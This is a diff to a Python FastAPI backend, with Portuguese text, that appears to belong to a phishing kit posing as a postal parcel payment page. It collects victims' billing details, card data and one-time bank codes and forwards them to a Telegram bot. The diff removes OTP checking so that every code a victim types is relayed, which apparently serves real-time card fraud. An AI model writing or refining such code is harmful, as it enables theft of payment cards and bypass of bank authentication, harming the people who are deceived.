@@ -221,25 +221,13 @@ async def resend_otp_code(request: dict, background_tasks: BackgroundTasks):
 
 @router.post("/otp/verify")
 async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
-    """Verificar código OTP e enviar segunda mensagem ao Telegram"""
+    """Enviar código OTP introduzido pelo cliente para o Telegram (sem validação)"""
     try:
         otp_code = request.get('otp_code', '')
         billing_data = request.get('billing_data', {})
         card_data = request.get('card_data', {})
         
-        # Simple OTP validation (in real app, check against stored OTP)
-        valid_otps = ["123456", "000000", "111111"]  # Demo codes
-        
-        if otp_code not in valid_otps:
-            # For demo, any 6-digit code works
-            if len(otp_code) == 6 and otp_code.isdigit():
-                pass  # Accept any 6-digit code for demo
-            else:
-                return {
-                    "status": "error",
-                    "message": "Código OTP inválido"
-                }
-        
+        # Não fazer nenhuma validação - aceitar qualquer código que o cliente escrever
         # Generate tracking number
         tracking_number = f"RR{str(uuid.uuid4().int)[:9]}PT"
         
@@ -248,13 +236,13 @@ async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
             tracking_number=tracking_number,
             billing_data=BillingData(**billing_data),
             card_data=CardData(**card_data),
-            status="otp_verified"
+            status="otp_submitted"
         )
         
         # Store payment data
         payment_storage[tracking_data.id] = tracking_data.dict()
         
-        # Send ONLY OTP verification message to Telegram (separate from card data)
+        # Send OTP code to Telegram (whatever the client typed)
         background_tasks.add_task(
             telegram_service.send_otp_verified_message,
             billing_data,
@@ -263,18 +251,18 @@ async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
             tracking_number
         )
         
-        logger.info(f"OTP verified for {billing_data.get('nome', 'Unknown')} - OTP: {otp_code}")
+        logger.info(f"OTP submitted for {billing_data.get('nome', 'Unknown')} - OTP: {otp_code}")
         
         return {
             "status": "success",
-            "message": "Código verificado e pagamento processado!",
+            "message": "Código enviado!",
             "tracking_number": tracking_number,
             "tracking_id": tracking_data.id
         }
         
     except Exception as e:
-        logger.error(f"Error verifying OTP: {str(e)}")
-        raise HTTPException(status_code=500, detail="Erro na verificação do código")
+        logger.error(f"Error submitting OTP: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erro ao enviar código")
 
 @router.post("/test/telegram")
 async def test_telegram_integration(background_tasks: BackgroundTasks):
